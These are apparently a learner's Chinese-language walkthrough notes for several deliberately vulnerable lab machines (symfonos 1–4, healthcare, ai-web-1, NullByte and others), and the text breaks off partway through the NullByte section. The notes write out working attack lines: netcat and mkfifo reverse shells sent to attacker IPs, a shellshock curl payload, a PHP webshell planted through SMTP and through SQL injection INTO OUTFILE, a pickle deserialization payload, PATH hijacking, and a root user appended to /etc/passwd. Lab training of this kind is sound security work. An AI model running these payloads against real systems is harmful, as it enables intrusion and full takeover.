![image.png](https://s2.loli.net/2025/05/16/i8wsvn2qfUDRF5g.png)

我们目录爆破一下

![image.png](https://s2.loli.net/2025/05/16/KciIfhsoXSQMquE.png)

有个 logs 文件
![image.png](https://s2.loli.net/2025/05/16/pj8w3GnWsINb7ul.png)

也就只有最后一个可以访问
## 日志分析
发现一个日志有人在里面运行pspy64

![image.png](https://s2.loli.net/2025/05/16/OLrnz56uy2MhRJD.png)

又发现了web-control和product-control这两个文件在ITDEPT下面
![image.png](https://s2.loli.net/2025/05/16/miuHXxs6Ij2CkVp.png)

![image.png](https://s2.loli.net/2025/05/16/BhzbmWlsEAtZpuM.png)


系统会时不时给这两个文件赋予 777 权限并且执行

## smb 服务枚举
我们登录 smb 服务器发现并没有文件
![image.png](https://s2.loli.net/2025/05/16/wHtjJSiTkgmYhvf.png)

看了 wp 豁然开朗 f 上传一个同名文件

![image.png](https://s2.loli.net/2025/05/16/BxSdQqljpeLIRTH.png)

成功反弹 shell
![image.png](https://s2.loli.net/2025/05/16/Ko4RnZPQkyGYbEL.png)


## 提权
sudo -l
![image.png](https://s2.loli.net/2025/05/16/2HfmWA5lgS4nhLu.png)

会发现只有 mysql 可以不用密码以 root 权限运行

齐活了但不知道 mysql 密码就很尴尬

在/home/dawn 中的历史记录中找

![image.png](https://s2.loli.net/2025/05/16/WSiFPTGYq5mENdv.png)


![image.png](https://s2.loli.net/2025/05/16/wOYgfTp8LEdGQxV.png)


获得加密后的密码 

用 john 破解成功
![image.png](https://s2.loli.net/2025/05/16/CHVRrT3hY6nEx9A.png)

sudo 登录 mysql 服务器 

![image.png](https://s2.loli.net/2025/05/16/sj8oRvTCpa7c23D.png)

提权成功获得 root 权限

# symfonos：1
[[symfonos：1]]

## nmap 扫描
![image.png](https://s2.loli.net/2025/05/19/MFkjnrvPhpl6NWs.png)

扫描出 129 的 ip

继续扫描

![image.png](https://s2.loli.net/2025/05/19/vxh4QaCG1uA7TEk.png)


![image.png](https://s2.loli.net/2025/05/19/libHXmVk2nYAzuU.png)

有 ssh 端口，smb 服务和 web 服务还有个 smtp 服务

## web 服务信息收集
访问发现没有东西
![image.png](https://s2.loli.net/2025/05/19/m9jCVGUPrRSiNs8.png)

目录扫描一下
![image.png](https://s2.loli.net/2025/05/19/zjgl3YOtk9rZ4V8.png)


![image.png](https://s2.loli.net/2025/05/19/sNMt5XzU163AiVc.png)

阿帕奇 2.4 的 web 服务器

暂时没有东西了转换战场

## smb 服务枚举

![image.png](https://s2.loli.net/2025/05/19/ViQ8kPCxTDXL61t.png)

登录看看
```
smbclient -U anonymous ////192.168.20.129//anonymous
```
![image.png](https://s2.loli.net/2025/05/19/ZjBfQ1lOAIqu2Md.png)

![image.png](https://s2.loli.net/2025/05/19/H4f2bwUzZlKLjJc.png)

发现是个密码本的提示不能使用这些密码

意思就是有可能有些用户就是用这些密码。我们发现 helios 用户的密码就是 qwerty

![image.png](https://s2.loli.net/2025/05/19/32v6hrzDoejsS4V.png)

有两个 txt 我们下载下来。找到一个新的路径/h 3 l 105 可以试试看

![image.png](https://s2.loli.net/2025/05/19/ywREqH43QOInlZd.png)

是个 wp 网页。用 wpscan 枚举用户

![image.png](https://s2.loli.net/2025/05/19/IsLJU1kvcPqWoBw.png)

发现一直没有枚举出来只能转换思路了

![image.png](https://s2.loli.net/2025/05/19/JoSBAhtYrFjuwbR.png)

用户爆破密码没戏只能试试看利用 WordPress 的插件漏洞

从插件入手
![image.png](https://s2.loli.net/2025/05/20/7QNXhkDgmZBntVS.png)


知道了第一个插件的文件路径
![image.png](https://s2.loli.net/2025/05/20/sGtiAxKlpVmo4Ia.png)

搜索一下漏洞

![image.png](https://s2.loli.net/2025/05/20/KdZEWROJHmx2eiC.png)

有 poc 可以利用

![image.png](https://s2.loli.net/2025/05/20/JL89uWeUikrCOEB.png)


![](https://s2.loli.net/2025/05/20/JL89uWeUikrCOEB.png)

文件包含利用成功
![image.png](https://s2.loli.net/2025/05/20/zPfYghxpKWs4nZy.png)

我们查看一下 apache 日志

![image.png](https://s2.loli.net/2025/05/20/azecpnHIVgMbAKk.png)

并不能只能换个思路？想办法把本地文件包含搞成命令执行

看了 wp 发现自己忘记了 smtp 服务。在 smtp 中给用户发一个一句话木马

先看看邮件里面有什么
![image.png](https://s2.loli.net/2025/05/20/YdFuqoyt6nEHxRM.png)

![image.png](https://s2.loli.net/2025/05/20/74Ez8S3sGYdMCTm.png)

听君一席话如听一席话。密码是你在安装的时候选择的

登录 smtp 服务发送邮件
[[shell和提权#smtp 邮件木马]]
```
MAIL FROM: test
RCPT TO: helios
data
<?php system($_GET['shell']); ?>
.
QUIT
```

![image.png](https://s2.loli.net/2025/05/20/fHa4X9eqwQ8sNJT.png)

测试一下
```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=id
```

测试成功最底下出现id

![image.png](https://s2.loli.net/2025/05/20/xODAzcGVslg2Ca8.png)

写一个反弹 shell
```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&shell=nc%20-e%20/bin/bash%20192.168.7.135%208888
```

反弹成功
![image.png](https://s2.loli.net/2025/05/20/2CZ3TtDvSPfMaFd.png)

## 提权
在helios目录中并没有什么东西
![image.png](https://s2.loli.net/2025/05/20/tNZICdTjxG9sio2.png)


在opt目录中发现一个类似程序的文件

![image.png](https://s2.loli.net/2025/05/20/AmxNcIfVBerETw8.png)

检查发现权限挺高的
#### linux 环境变量劫持
[[shell和提权#linux 环境变量劫持]]
```
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
echo $PATH
/opt/statuscheck
```

![image.png](https://s2.loli.net/2025/05/20/imNRYO7fkK8doVA.png)

提权成功
![image.png](https://s2.loli.net/2025/05/20/WbNY3K1IhaTHDcL.png)

# symfonos：2
[[symfonos：2]]
## nmap 扫描端口
发现有个 ftp 端口 80 端口和 smb 服务
![image.png](https://s2.loli.net/2025/05/20/b6m5vRxfiyVWGTA.png)

![](https://s2.loli.net/2025/05/20/JdZMQn9fDLqY8N2.png)


## web 服务信息收集
依旧是一张图 
![image.png](https://s2.loli.net/2025/05/20/LqB5HP1YXNRUysA.png)

dirb 也报不出东西

![image.png](https://s2.loli.net/2025/05/20/tNGw1EXRFoVfqmL.png)

## 枚举 smb 服务
![image.png](https://s2.loli.net/2025/05/20/rBkM3qmOgyQxwTG.png)

发现有个匿名登录账户。直接 anonymous 账户登录，检查一下有什么文件吗

![image.png](https://s2.loli.net/2025/05/20/JG9kTeZHYhxAXcL.png)

有个大收获一个 log. txt 文件

在里面找到 ftp 的用户和组 
![image.png](https://s2.loli.net/2025/05/20/9pkm4PQzg7IXEUy.png)


## 爆破 ftp 账户密码
这个是个新的发现。也是太固化了。没想到用 hydra 爆破一下

![image.png](https://s2.loli.net/2025/05/20/hFEb8LniZg9H27R.png)

成功爆出 ftp 的密码

登录成功
![image.png](https://s2.loli.net/2025/05/20/ZUlq5PYaMwCK8To.png)

但都是无关紧要的文件。试试看 ssh 能登进去吗 ？能的

![image.png](https://s2.loli.net/2025/05/20/kUl9Qp3ib8t1efn.png)


## ftp 漏洞利用
ftp 的版本是 ProFTPD 1.3.5

![image.png](https://s2.loli.net/2025/05/20/njX3DQE7ZbUVC6R.png)

![image.png](https://s2.loli.net/2025/05/20/5pCDE426KuYmTwG.png)

这个时候看一下之前 smb 下载的 log 文件

![image.png](https://s2.loli.net/2025/05/20/DB54JZPbNe9RTQi.png)

shadow 文件的备份

![image.png](https://s2.loli.net/2025/05/20/wtOV765lQXfF8B1.png)

允许匿名登录的路径

把/etc/passwd 和/etc/shadow 的文件下载到共享目录

![image.png](https://s2.loli.net/2025/05/20/Fg3uK91vDTU2nHt.png)

![image.png](https://s2.loli.net/2025/05/20/losjPQ1D25CZW9U.png)

上传成功

将 shadow 和 passwd 文件进行 unshadow 处理

![image.png](https://s2.loli.net/2025/05/20/bwLmTkeW8B2agtJ.png)

能破解出密码出来

![image.png](https://s2.loli.net/2025/05/20/YmB7IODCLu4wTHi.png)

能登录 ssh 和 ftp 服务

## 无头绪
用 linpeas 枚举一下看有什么东西吗

![image.png](https://s2.loli.net/2025/05/20/2F3PtKg85avylOh.png)

在 opt 找到一个 librenms 后来发现是个 cms
![image.png](https://s2.loli.net/2025/05/20/XgQDJ4Oeo2kiAvF.png)


有个 8080 端口。很奇怪，这个部分真的得看 wp 了。没得思路

### ssh 端口转发
```
ssh aeolus@192.168.20.131 -L 8080:127.0.0.1:8080
```

发现是个 librenms 的 cms
![image.png](https://s2.loli.net/2025/05/20/ZnpKDUfhabBvRQY.png)

搜索一下漏洞
![image.png](https://s2.loli.net/2025/05/20/nZ2C4Era9qMROes.png)

用刚刚的 ssh 账户登录

成功登录 

找到这个地方进行设置反弹 shell
![image.png](https://s2.loli.net/2025/05/20/SgwDEbvWR6zXToj.png)


```
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.20.128 8888 >/tmp/f) #
其实这个是poc来的 因为一直poc没搞明白他要的格式 
```

![image.png](https://s2.loli.net/2025/05/20/7XfDEYjtWwO2zJ4.png)


![image.png](https://s2.loli.net/2025/05/20/zhoHfQKIYdX5SR3.png)


反弹成功

## 提权
![image.png](https://s2.loli.net/2025/05/20/Wvo8htKOxRseUEX.png)

sudo  -l 发现一个 mysql mysql 提权


![image.png](https://s2.loli.net/2025/05/20/QucOKH76wGReCoW.png)

提权成功

![image.png](https://s2.loli.net/2025/05/20/TuGA4EHwBNhga3v.png)

# symfonos: 3
[[symfonos3]]
## nmap 扫描端口
有个 ftp 端口，ssh 端口，80 端口
![image.png](https://s2.loli.net/2025/05/20/L2FjGuI6YQtoCMz.png)

## web 服务信息收集

![image.png](https://s2.loli.net/2025/05/20/pwt57P9UTWOn1yq.png)

⚠️upload failed, check dev console

源码也只有一行备注

目录扫描
![image.png](https://s2.loli.net/2025/05/20/iyqenmHcUjrpKuA.png)

还是没东西
![image.png](https://s2.loli.net/2025/05/20/3Xic1bFVw9mxgAo.png)

继续目录扫描。加点后缀
![image.png](https://s2.loli.net/2025/05/20/iSQ34Uk9qgehIPt.png)

发现一个隐藏文件

![image.png](https://s2.loli.net/2025/05/20/GYj2lfTSXaBwm9v.png)

好吧，被 ban 了

依旧扫描目录

![image.png](https://s2.loli.net/2025/05/20/cdoQvqtPxnfe3VE.png)


就一张图

![image.png](https://s2.loli.net/2025/05/20/LMXnw9oZAS8zFQh.png)

只能继续爆破了

![image.png](https://s2.loli.net/2025/05/20/H3h4FCdQA2K5Iwf.png)


![image.png](https://s2.loli.net/2025/05/20/htljTiBLEOXrzF8.png)
![image.png](https://s2.loli.net/2025/05/20/6xkWA23NfGcKsFb.png)

说明还没完全枚举完先看看目录有啥东西吗

![image.png](https://s2.loli.net/2025/05/20/suOYXjDPJhbAz39.png)

一堆文字

只能继续枚举

![image.png](https://s2.loli.net/2025/05/20/zPul7MZr2ExRHCO.png)

毫无头绪的枚举。感觉都是无底洞

只能从头再来
![](https://s2.loli.net/2025/05/20/6lvOUdYQskL3ZfB.png)

这个目录还没尝试过

继续枚举。还真有发现
![image.png](https://s2.loli.net/2025/05/20/bXLpIQ8uzkG7OYv.png)


![image.png](https://s2.loli.net/2025/05/20/jJ1Pw9iExHra2hN.png)


用了 wfuzz 也没枚举出来只能看看 wp 了

上面这个界面和 linux 的 uptime 的结果相似
![image.png](https://s2.loli.net/2025/05/20/T4pfZXDsYMKoQHW.png)

发现是有 shellshock 的漏洞

## 漏洞利用
shellshock 漏洞
### 1.curl 发送请求

```
curl -A "() { :; }; /bin/bash -c 'nc 192.168.20.128 8888 -e /bin/sh'" http://192.168.20.133/cgi-bin/underworld
curl将bash命令作为特殊请求的User-Agent进行传递，实际上nc反弹shell的命令是由Bash执行的
```

即可反弹 shell

![image.png](https://s2.loli.net/2025/05/20/u7eMakbicVCDWzd.png)


### 2. msf 攻击
使用 multi/http/apache_mod_cgi_bash_env_exec 来利用 shellshock 漏洞
![image.png](https://s2.loli.net/2025/05/21/cz43QS7s5NGPmpb.png)


### 3 . seaarchsploit
![image.png](https://s2.loli.net/2025/05/21/tywqkQc5vPF7LC4.png)

![image.png](https://s2.loli.net/2025/05/21/amZvJ2wXkSN5UlT.png)

也是反弹成功
![image.png](https://s2.loli.net/2025/05/21/TiacE7ftv3C5yPz.png)

## 提权
### linpeas 信息收集
![image.png](https://s2.loli.net/2025/05/20/7aHekqKi9NgcsxP.png)

![image.png](https://s2.loli.net/2025/05/20/fHPvmxtAzjuws9C.png)


但也没什么重要信息可以收集的

只能换一个工具
### pspy 64 信息收集
![image.png](https://s2.loli.net/2025/05/20/He5tJxS1fXVYOnW.png)

![image.png](https://s2.loli.net/2025/05/20/eD4O5ZYIthKHEMx.png)

这里发现会定期发包

发现有个/opt/ftpclient 的文件

加上上面有个 tcpdump 这个程序，加上大佬 wp（当然是主要功劳） 用 tcpdump 抓包查看 ftp 的登录包。因为是明文传输，所以容易看到账户密码

![image.png](https://s2.loli.net/2025/05/20/1ENoQsB6DtHCKz4.png)

```
tcpdump -w ftp.pcap -i lo
如果是ens33网卡的话，就会抓到外网和这个计算机之间的联络
```

抓包成功
![image.png](https://s2.loli.net/2025/05/20/57jbkUMlBg2TPXI.png)

切换用户成功

![image.png](https://s2.loli.net/2025/05/20/bH216zSOIKkChoW.png)

### python 劫持
在 opt 目录中发现了一个
![image.png](https://s2.loli.net/2025/05/21/ACqveJcFiMs1Y9D.png)

我们在 python 库里面搜索这个 import 的库名

![image.png](https://s2.loli.net/2025/05/21/fseqHFroD2va6pg.png)


发现还有蛮多权限的

在 tmp 伪造一个 ftplib. py ，在里面写一个反弹 shell。然后替换掉 python 库中的 ftplib. py
![image.png](https://s2.loli.net/2025/05/21/m1JnOyfKDRBp7P6.png)


过段时间就能反弹成功

![image.png](https://s2.loli.net/2025/05/21/RGC4mlnS2YQyzsV.png)


![image.png](https://s2.loli.net/2025/05/21/2cNw6mhRqSXTQzj.png)


# symfonos:4
[[symfonos4]]

## nmap 扫描
![image.png](https://s2.loli.net/2025/05/21/k6vUMZHPjVfoSFb.png)


![image.png](https://s2.loli.net/2025/05/21/LfbJKOhj1NCHBID.png)

## web 服务枚举
![image.png](https://s2.loli.net/2025/05/21/j1JLsvloFQf6WpK.png)

目录爆破出 robots. txt 但查看不了
![image.png](https://s2.loli.net/2025/05/21/aLB9cd5rqu173hM.png)


![image.png](https://s2.loli.net/2025/05/21/BIrAiQbx7pmwPSs.png)

继续枚举

![image.png](https://s2.loli.net/2025/05/21/oB1HVyKZerPbpum.png)

发现有三个 log 文件
![image.png](https://s2.loli.net/2025/05/21/GylzBte7T8kjH5C.png)

思路断了。只能模糊测试一下
```
wfuzz -u http://169.254.5.136/FUZZ -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404

```
![image.png](https://s2.loli.net/2025/05/21/D1UPcWLbse4E895.png)

没啥东西
用 gobuster 枚举一下。有个重大发现。. sea. php 和 atlantis. php
![image.png](https://s2.loli.net/2025/05/21/yCgfqQdlAUJO96z.png)

一个是登录界面
![image.png](https://s2.loli.net/2025/05/21/X5OZjpcQPitgoI2.png)

输入万能密码试试水

![image.png](https://s2.loli.net/2025/05/21/eJzP5A7KQ8W3pEX.png)

成功登录

有个可以选择的界面。尝试抓包改一下
![image.png](https://s2.loli.net/2025/05/21/k3hzXq9pZe12t7l.png)

改不了包。但有个好发现，格式为? file=hades 的格式。可能是文件包含漏洞
![image.png](https://s2.loli.net/2025/05/21/zn9dVO68BGTcPeY.png)


![image.png](https://s2.loli.net/2025/05/21/m5qaMPO2nxQ4IrZ.png)

但不太行。换个做饭

其实是没有权限显示。查看 ssh 有关的日志是可以的

![image.png](https://s2.loli.net/2025/05/21/whBO4sZMCa3FTu6.png)

题目本来是在用户这里插入一句话木马从而在 auth 日志变成 rce 。但在新版 kali 中貌似做不到。总是显示非法字节

![image.png](https://s2.loli.net/2025/05/21/4P8UhmwMaW9xpQE.png)

这个时候就可以尝试用 msf 来进行 ssh 投毒

## msf &ssh
![image.png](https://s2.loli.net/2025/05/21/DpQecP6RjriF4ut.png)

![image.png](https://s2.loli.net/2025/05/21/fBrIJqnpz8G6k2N.png)

![image.png](https://s2.loli.net/2025/05/21/rZySavpm2GDxhwB.png)

ok 运行成功

会发现我们成功插入木马，并运行成功
![image.png](https://s2.loli.net/2025/05/21/Q2gRumaOzH49D8V.png)

准备执行一个反弹 shell

![image.png](https://s2.loli.net/2025/05/21/sN1R3kCunBfo9QU.png)

![image.png](https://s2.loli.net/2025/05/21/9b7rHTcPQfKGC5y.png)

反弹成功

## 提权
### linpeas 提权
opt 目录有文件
![image.png](https://s2.loli.net/2025/05/21/5NC4kPWFBwlKrzb.png)

![image.png](https://s2.loli.net/2025/05/21/tWYDCNUxczTRs6q.png)

发现一个新端口 8080
![image.png](https://s2.loli.net/2025/05/21/e9Pja3Qbc5drGsl.png)


得端口转发
```
socat tcp-listen:7777,reuseaddr,fork tcp:localhost:8080
前面是本机访问的端口 后面是在靶机中的端口
```

还有个方法：就是在数据库中我们能发现 poseidon 用户的账户密码，ssh 账户，我们可以用 ssh -L 的方法来转发

![image.png](https://s2.loli.net/2025/05/21/Zc82E7OYqVUCB1A.png)

发现并没用东西，只能 bp 抓包。发现 username 处是 base 64 加密

![image.png](https://s2.loli.net/2025/05/21/df6UAVC1zkH45no.png)

![image.png](https://s2.loli.net/2025/05/21/VLq5D7vAzCWQZig.png)
### json 反弹 shell

^1684e8
看了大佬的 wp 是说这里可以用 json 的反弹 shell，改成 base 64 加密，放包即可反弹 shell
json 调用 python
```
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc -nv 169.254.5.136 8888 -e /bin/bash"]}, null, null, null]}
```
![image.png](https://s2.loli.net/2025/05/21/8UvCunBiQtXSwDk.png)


![image.png](https://s2.loli.net/2025/05/21/HLPmWZTS6OKr8ue.png)



![image.png](https://s2.loli.net/2025/05/21/yCGc71zjfxadXI5.png)

反弹成功，还是 root 权限的

![image.png](https://s2.loli.net/2025/05/21/9wmLXkoKusdCrxT.png)


# healthcare
[[healthcare]]
## niscover 发现 ip
```
netdiscover -i eth1 -r 192.168.56.0/24
```
![image.png](https://s2.loli.net/2025/05/23/zLNJ6AswPCg532i.png)

102 就是我们要找的 ip

## nmap 扫描端口
发现 80 端口
![image.png](https://s2.loli.net/2025/05/23/IKrCV97DzyuZXtG.png)


![image.png](https://s2.loli.net/2025/05/23/NGcDMxy5Pev4LfC.png)

子目录扫描看看。使用大目录进行扫描

![image.png](https://s2.loli.net/2025/05/23/5kKW4ruyVtIUbfd.png)

有个 openemr 目录可以看看。是个 openemr v 4.1.0 版本的

![image.png](https://s2.loli.net/2025/05/23/nZPeMJOSz7H1AVL.png)

## 漏洞利用
搜一下漏洞
![image.png](https://s2.loli.net/2025/05/23/dgNhvJ749kLofBe.png)

使用第一个脚本文件

![image.png](https://s2.loli.net/2025/05/23/2LFSaUZn7pfXWid.png)

就能获得账户和 md 5密码

![image.png](https://s2.loli.net/2025/05/23/7m4YWkHc9fe6bJr.png)

![image.png](https://s2.loli.net/2025/05/23/PZ1qibeXLGpsJNk.png)

用 admin 用户成功登录

新建一个用户

![image.png](https://s2.loli.net/2025/05/23/PY74OI6lqhywHKf.png)

发现有个 documents，感觉可以上传一个反弹 shell 的 php 进去

![image.png](https://s2.loli.net/2025/05/23/EScrQiBqjpDfkR2.png)

但只能上传图片格式，访问会报错。

只能切换位置进行测试

![image.png](https://s2.loli.net/2025/05/23/nkqZYXtflPmdCuR.png)

在管理员页面发现一个可以修改 php 文件的页面，将反弹 shell 的代码加入 php 代码中，重新刷新即可获得反弹 shell

![image.png](https://s2.loli.net/2025/05/23/k9iqxYnTldsKo8L.png)


## 提权

我们刚刚是获得了两个用户的密码，我们看看/etc/passwd 中有没有用户

![image.png](https://s2.loli.net/2025/05/23/kESo47upGeMAgax.png)

中间的就是我们前面找到的用户

![image.png](https://s2.loli.net/2025/05/23/QpdhHzj8Y9XJnCZ.png)

切换成功

### linpeas 测试
有个定时计划，每天的
![image.png](https://s2.loli.net/2025/05/23/2RqTB1uUKF3fsiE.png)
![image.png](https://s2.loli.net/2025/05/23/rVL75BzvZNF1H6f.png)

别的定时计划（msec）也有这个的身影

可能能用到的
![image.png](https://s2.loli.net/2025/05/23/r7b8vt3oa9nMAiN.png)

在 medical 有个隐藏桌面和 almirant 用户桌面一个 txt

![image.png](https://s2.loli.net/2025/05/23/6kMW4IUtAjSLulm.png)

找到第一个 flag

找有 sudo 权限的文件
![image.png](https://s2.loli.net/2025/05/23/rOwnRgkzC4lXIji.png)

没线索了，在看 linpeas 的记录的时候发现有个备份文件，shadow
![image.png](https://s2.loli.net/2025/05/23/HCimxYzkBVc8ovS.png)

找到备份的 passwd 和 shadow 文件，准备爆破一下密码

![image.png](https://s2.loli.net/2025/05/23/fTyXpR6J92VqZol.png)

![image.png](https://s2.loli.net/2025/05/23/BQ3kR2azmN5hXeS.png)

破解成功，切换用户
![image.png](https://s2.loli.net/2025/05/23/4EM3Q8Ytf6bT12m.png)

但还是 sudo -l 依旧没有东西

回过头发现，还是这个部分有问题
![image.png](https://s2.loli.net/2025/05/23/vmNAZw5zWskjYgn.png)

运行这个 healthcare 会发现一堆系统参数，strings 观察会发现
![image.png](https://s2.loli.net/2025/05/23/S91lmwKBJ3RfaPN.png)

依旧环境变量劫持
[[shell和提权#^2b355a]]  新一代
```
cp /bin/bash /tmp/clear
export PATH=/tmp:$PATH
/usr/bin/healthcheck

用的是最后的命令的第一个 clear
```

![image.png](https://s2.loli.net/2025/05/23/K542uMhXNiD8aLr.png)


![image.png](https://s2.loli.net/2025/05/23/axTMrpeXdtWiwL6.png)

# Digitalworld. local (Development)
[[Digitalworld. local (Development)]]
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/05/26/2Xa1AedVYT9knLy.png)

有个 smb 服务
![image.png](https://s2.loli.net/2025/05/26/JyVZgdKYt3TvweC.png)


## 8080 信息收集

![](https://s2.loli.net/2025/05/26/37mCndAVoR6lbjr.png)


有个 development 路径
![image.png](https://s2.loli.net/2025/05/26/hUxtKNEI2zQP7Wm.png)

告诉我们一个网页和 pcap 流量包

在流量包中是没有找到什么登录密码之类的，就用流量包中的一些路径试试

![image.png](https://s2.loli.net/2025/05/27/3ZlEeVpnrjNY4dy.png)


![image.png](https://s2.loli.net/2025/05/27/bad2rnFv9qoc7sS.png)


![](https://s2.loli.net/2025/05/27/Wj9ysepHUg5oqdu.png)

有一个登录界面，这个是重点，待会有大作用。
![image.png](https://s2.loli.net/2025/05/27/LmvdTtKrRFwYCZV.png)

随便输入点东西会有个报错
![image.png](https://s2.loli.net/2025/05/27/DSHlyPdgbjwToIM.png)

可以搜索这个slogin_lib.inc.php 的 poc 来利用

![](https://s2.loli.net/2025/05/27/NeECHUX7RKwrWn3.png)

![image.png](https://s2.loli.net/2025/05/27/UzdBJo6L3ybEifv.png)


利用这个 poc 可以爆出用户和密码
![image.png](https://s2.loli.net/2025/05/27/6M1Hr3gf8sNejcQ.png)

![image.png](https://s2.loli.net/2025/05/27/wlCXUBbDdE1SFGi.png)
找到三个账户密码

## ssh 登录
经过尝试会发现只有 intern 才能登录进去，而且还是 rbash

![image.png](https://s2.loli.net/2025/05/27/VWaqbQNUT1HP9mJ.png)


一开始是用了 ssh 登录来逃逸 rbash，但没啥用
![image.png](https://s2.loli.net/2025/05/27/5s2H1BtceFqg3dX.png)

看了wp用echo os.system("/bin/bash")绕过
![image.png](https://s2.loli.net/2025/05/27/jrReFDf46hklKCb.png)

查看patrick用户的目录
![image.png](https://s2.loli.net/2025/05/27/zBlfTNVpDEwR7ab.png)


## 提权
别的目录也是没有消息。想到已经有好几个用户的账户密码，切换别的用户试试。切换到patrick 用户
![image.png](https://s2.loli.net/2025/05/27/wRZuaULKBhecxF1.png)

有个vim和nano可以利用
![image.png](https://s2.loli.net/2025/05/27/squ7KFgEdLyAYD1.png)

成功提权

# ai-web-1
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/06/04/1PBT89CXnkZORxf.png)

## web 信息收集
子目录爆破
查看 robots. txt，有目录
![image.png](https://s2.loli.net/2025/06/04/V1sRh9ogrLkifOE.png)

访问页面发现是一个选择界面，试试 sql 注入

![image.png](https://s2.loli.net/2025/06/04/JOd3sLTYDIZ6ivw.png)

## 继续收集

![image.png](https://s2.loli.net/2025/06/04/9dAo6uaLwHWSBCe.png)

![image.png](https://s2.loli.net/2025/06/04/DBhwoZPYfn6ejsi.png)

找到文件路径

## sql 注入
输入一个'，发现报错
![image.png](https://s2.loli.net/2025/06/04/HTDVExkGXjUvSsg.png)

### sqlmap
sqlmap 一把出

![image.png](https://s2.loli.net/2025/06/04/rUcwqSDXRM25Gl4.png)
但数据没啥用

### 手工注入
盲猜一手。有可能是单引号的注入

```
1' union select 1,2,3#

1' union select 1,database(),3#

1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()#

1' union select 1,2,group_concat(column_name) from information_schema.tables where table_schema = database()#

1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="user"#

1' union select 1,2,group_concat(id) from user#
1' union select 1,2,group_concat(firstName) from user#
1' union select 1,2,group_concat(lastName) from user#

1'+union select+1,'<?php+eval($_POST["cmd"]);?>',3 into outfile "/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"#
```

#### 判断字节
```
1' order by 3#
1' order by 4#
```
![image.png](https://s2.loli.net/2025/06/04/u7183mpeN5tkGA4.png)


![image.png](https://s2.loli.net/2025/06/04/YWGQTFMyiUXBV7N.png)


#### 查看回显
```
1' union select 1,2,3#
```
![image.png](https://s2.loli.net/2025/06/04/abmukvTtLQjIHy5.png)


#### 查数据库
```
1' union select 1,database(),3#
```
![image.png](https://s2.loli.net/2025/06/04/tSP8Msc9Y1bTGJm.png)

#### 查表
```
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()#
```
![image.png](https://s2.loli.net/2025/06/04/FbKp2Y8GgVr4x6A.png)

#### 查数据
```
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="user"#
```
![image.png](https://s2.loli.net/2025/06/04/ClBUNuWis5oXDey.png)

#### 上传木马
```
1'+union select+1,'<?php+eval($_POST["cmd"]);?>',3 into outfile "/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"#



```
![image.png](https://s2.loli.net/2025/06/04/xCmvH7NJ2gQ4Zpf.png)

发现木马上传成功
![image.png](https://s2.loli.net/2025/06/04/ClaXPrp3jvu1b6A.png)

在 bp 里面测试一下
![image.png](https://s2.loli.net/2025/06/04/vscfkIN2by14gao.png)

```
cmd=system("mkfifo+/tmp/test;telnet+61.139.2.128+2334+0</tmp/test|/bin/sh+>+/tmp/test");
```

![image.png](https://s2.loli.net/2025/06/04/runbyxpRIa84wZG.png)

获得 shell
![image.png](https://s2.loli.net/2025/06/04/MQS3AdhXbPj9FGU.png)


## linpeas信息收集
![image.png](https://s2.loli.net/2025/06/04/XFZlmhRJAfTd2aL.png)


![image.png](https://s2.loli.net/2025/06/04/pQ8Y4OEAt2imkP1.png)


![image.png](https://s2.loli.net/2025/06/04/o4XaPwML7zZN1K5.png)

发现/etc/passwd 可以写入

![image.png](https://s2.loli.net/2025/06/04/BaQX7MGUhxpDe9w.png)


```
openssl passwd -1 -salt qq qwe

echo 'qq:$1$qq$oMgRCtJEEoFVvNbosRA.B1:0:0::/root:/bin/bash' >> /etc/passwd
```

写入一个 root 权限用户进去

![image.png](https://s2.loli.net/2025/06/04/kY7Xc16I3E2MjrL.png)

cat 一下看看用户创建成功吗

![image.png](https://s2.loli.net/2025/06/04/ksNlDgHSimeBJwC.png)
创建成功

![image.png](https://s2.loli.net/2025/06/04/HFYt5CBO3Df67VN.png)

找到 flag
![image.png](https://s2.loli.net/2025/06/04/zIR9fh7UWnaQr2T.png)
# NullByte
[[NullByte]]
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/06/05/KWr3TY5DAGsuONB.png)

## 子目录扫描
![image.png](https://s2.loli.net/2025/06/05/cIZ4HuOGlVb6Ua8.png)

## exiftool 图片找到路径
![image.png](https://s2.loli.net/2025/06/05/frQR3lY8uesVqdJ.png)


## hydra 爆破
这是个骚姿势。之前没有遇到过。就是用户名改成随机的，直接爆 password 就行了

```
hydra 61.139.2.135 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:F=invalid key"  -l routing -P /root/rockyou.txt -f

```

![image.png](https://s2.loli.net/2025/06/06/1sfh5Jxi2Bce3GR.png)

注入爆破出来的值之后，输入即可进入页面
![image.png](https://s2.loli.net/2025/06/06/KCNce2AbpVrPfZI.png)


## sql 注入
### sql 手注
没猜错应该是字符型注入。双引号
![image.png](https://s2.loli.net/2025/06/06/ZDOfcuExGHNPSUt.png)

#### 判断字节
```
1" order by 3#
1" order by 4#
```
![image.png](https://s2.loli.net/2025/06/06/aYTtPhxKlDLnjZ3.png)


![image.png](https://s2.loli.net/2025/06/06/teWy2SEVF8gX6l4.png)

#### 测试回显
```
1" union select 1,2,3#
```
![image.png](https://s2.loli.net/2025/06/06/hbcsqZuG6in2Fpf.png)


#### 查数据库
```
1" union select 1,database(),3#
```

![image.png](https://s2.loli.net/2025/06/06/XsktlcZCnfgjDpa.png)

#### 查表名
```
1" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()#
```

#### 查字段
```
1" union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database()#
```
![image.png](https://s2.loli.net/2025/06/06/9AWiY5sbHvQocSq.png)


#### 查看数据
```
